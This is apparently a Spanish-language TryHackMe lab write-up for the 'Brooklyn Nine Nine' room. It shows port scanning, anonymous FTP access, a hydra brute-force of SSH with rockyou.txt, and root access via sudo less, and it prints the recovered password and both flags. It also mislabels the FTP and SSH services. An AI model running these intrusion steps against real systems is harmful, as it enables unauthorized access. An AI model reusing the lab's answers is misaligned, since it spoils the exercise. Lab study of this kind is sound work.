# Brooklyn Nine Nine

## Escaneo de puertos

Lanzamos un mapeo de los puertos abiertos y lo servicios con`nmap`.

```
sudo nmap -sV -T4 -p- 10.10.93.36
```

Los puertos abiertos que hemos obtenido son los siguientes:

- 22 del servicio SSH (vsftpd)
- 21 del servicio FTP (OpenSSH)
- 80 de HTTP (Apache httpd)

![](Hacking_Etico/TryHackMe_WriteUps/Brooklyn_Nine_Nine/images/image.png)

## Acceso por FTP

Accedemos por el puerto 21 para ver si hay algo que útil. Nos identificamos como`anonymous` y encontramos una nota para Jake.

![](Hacking_Etico/TryHackMe_WriteUps/Brooklyn_Nine_Nine/images/image-1.png)

La descargamos.

```
get note_to_jake.txt
```

![](Hacking_Etico/TryHackMe_WriteUps/Brooklyn_Nine_Nine/images/image-2.png)

Mostramos el contenido de la nota y vemos que las credenciales de Jake pueden ser muy débiles.

![](Hacking_Etico/TryHackMe_WriteUps/Brooklyn_Nine_Nine/images/image-3.png)

## Ataque de fuerza bruta

Ya que sabemos que la cuenta de Jake puede ser vulnerable a ataques de fuerza bruta, vamos a ejecutar`hydra`con el diccionario de`rockyou.txt`para poder acceder por ssh con sus credenciales.

```
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.93.36 
```

La contraseña es`987654321`.

![](Hacking_Etico/TryHackMe_WriteUps/Brooklyn_Nine_Nine/images/image-4.png)

## Acceso por SSH

Ahora que tenemos las credenciales del usuario`jake`, accedemos por SSH al servidor.

```
ssh jake@10.10.93.36
```

![](Hacking_Etico/TryHackMe_WriteUps/Brooklyn_Nine_Nine/images/image-5.png)

Inspeccionando los usuarios que hay, descubrimos que`holt`tiene la flag.

![](Hacking_Etico/TryHackMe_WriteUps/Brooklyn_Nine_Nine/images/image-6.png)

```
ee11cbb19052e40b07aac0ca060c23ee
```

## Escalada de privilegios

Comprobamos cuantos binarios podemos ejecutar como sudo

```
sudo -l
```

![](Hacking_Etico/TryHackMe_WriteUps/Brooklyn_Nine_Nine/images/image-7.png)

Investigando en [GTFBins](https://gtfobins.github.io/) vemos que hay una vulnerabilidad con el comando`less`ejecutando el siguiente comando.

![](Hacking_Etico/TryHackMe_WriteUps/Brooklyn_Nine_Nine/images/image-8.png)

Empleamos el siguiente comando para obtener la flag del root.

```
sudo less /root/root.txt
```

![](Hacking_Etico/TryHackMe_WriteUps/Brooklyn_Nine_Nine/images/image-9.png)

```
63a9f0ea7bb98050796b649e85481845
```